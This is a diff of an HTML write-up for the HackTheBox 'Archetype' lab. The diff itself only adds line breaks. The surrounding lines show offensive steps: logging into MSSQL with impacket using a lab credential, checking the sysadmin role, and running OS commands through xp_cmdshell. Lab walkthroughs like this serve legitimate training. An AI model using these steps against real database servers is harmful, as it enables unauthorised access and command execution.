@@ -66,10 +66,10 @@ There are many python scripts in <a href="https://github.com/fortra/impacket">Im
 <b>cmd</b>：<code>python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@&lt;target_ip&gt; -windows-auth</code><br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/MSSQLauth.png" alt="MSSQLauth" width="60%"><br>
 After entering SQL, enter <code>help</code> to see which tools or functions are currently available.<br>
-<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/SQLhelp.png" alt="SQLhelp" width="60%">
+<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/SQLhelp.png" alt="SQLhelp" width="60%"><br>
 Confirm current identity (1=True).<br>
 <b>cmd</b>：<code>SELECT is_srvrolemember('sysadmin');</code><br>
-<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/SQLrole.png" alt="SQLrole" width="60%">
+<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/SQLrole.png" alt="SQLrole" width="60%"><br>
 If no settings have been configured, the result of the command is as shown in the pic below.<br>
 <b>cmd</b>：<code>EXEC xp_cmdshell 'net user';</code><br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/netuser.png" alt="netuser" width="60%">
